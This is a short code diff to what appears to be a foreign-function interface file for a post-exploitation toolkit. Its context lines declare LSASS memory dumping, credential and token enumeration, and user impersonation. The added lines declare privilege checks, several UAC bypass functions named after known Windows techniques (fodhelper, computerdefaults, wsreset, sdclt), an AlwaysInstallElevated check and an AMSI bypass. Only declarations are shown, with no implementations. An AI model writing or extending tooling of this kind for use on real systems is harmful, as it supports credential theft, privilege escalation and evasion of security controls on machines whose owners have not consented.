@@ -263,6 +263,20 @@ ffi jocky_lsass_dump() -> i32;
 ffi jocky_credentials_enumerate() -> [string];
 ffi jocky_token_enumerate() -> [i32];
 ffi jocky_impersonate_user(username: string, domain: string, password: string) -> bool;
+ffi jocky_is_admin() -> bool;
+ffi jocky_is_system_user() -> bool;
+ffi jocky_is_root() -> bool;
+
+// ---- UAC Bypass (user → high-integrity without UAC prompt) ----
+ffi jocky_uac_bypass() -> bool;
+ffi jocky_uac_bypass_fodhelper(self_path: string) -> bool;
+ffi jocky_uac_bypass_computerdefaults(self_path: string) -> bool;
+ffi jocky_uac_bypass_wsreset(self_path: string) -> bool;
+ffi jocky_uac_bypass_sdclt(self_path: string) -> bool;
+ffi jocky_check_always_install_elevated() -> bool;
+
+// ---- AMSI Bypass ----
+ffi jocky_bypass_amsi() -> bool;
 
 // ---- Generic Data Operations ----
 ffi jocky_data_base64_encode(data: i8*, size: i32) -> string;
